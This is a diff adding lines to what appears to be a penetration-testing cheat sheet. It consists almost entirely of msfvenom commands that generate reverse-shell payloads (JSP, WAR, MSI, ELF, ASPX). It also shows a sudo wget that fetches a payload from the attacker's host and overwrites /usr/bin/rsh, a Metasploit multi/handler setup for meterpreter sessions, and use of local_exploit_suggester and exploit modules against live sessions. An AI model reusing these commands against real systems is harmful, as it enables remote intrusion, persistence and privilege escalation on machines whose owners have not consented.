@@ -36,4 +36,27 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$port -f raw > tom.jsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > jerry.war
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f msi > myinstaller.msi
+
+msfvenom -p solaris/x86/shell_reverse_tcp lhost=$IP lport=$port -f elf > ata.elf
+php -S 0.0.0.0:80
+cd /tmp
+sudo /usr/bin/wget $IP/ata.elf -O /usr/bin/rsh
+/usr/bin/rsh
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f aspx -o ippsec.aspx
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST eth0
+set LPORT $port
+run
+
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+use $exploit
+show options
+set SESSION 2
+show options
+run
 ```
